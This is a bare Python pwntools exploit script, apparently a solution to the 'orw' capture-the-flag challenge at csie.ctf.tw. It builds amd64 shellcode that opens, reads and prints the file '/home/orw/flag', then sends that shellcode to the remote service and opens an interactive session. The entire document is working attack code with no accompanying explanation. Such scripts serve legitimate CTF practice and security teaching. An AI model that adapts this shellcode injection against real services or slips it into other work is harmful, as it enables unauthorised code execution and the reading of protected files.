from pwn import *

context.arch = "amd64"

shellcode = asm('''
    mov rax, 0x000067616c662f77
    push rax
    mov rax, 0x726f2f656d6f682f
    push rax

    mov rax, 2
    mov rdi, rsp
    mov rdx, 0
    mov rsi, 0
    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, rsp
    mov rdx, 0x64
    syscall

    mov rax, 1
    mov rdi, 1
    mov rdx, 0x64
    mov rsi, rsp
    syscall
    ''')

r = remote("csie.ctf.tw", 10124)
r.recvuntil(":")
r.send(shellcode)
r.interactive()
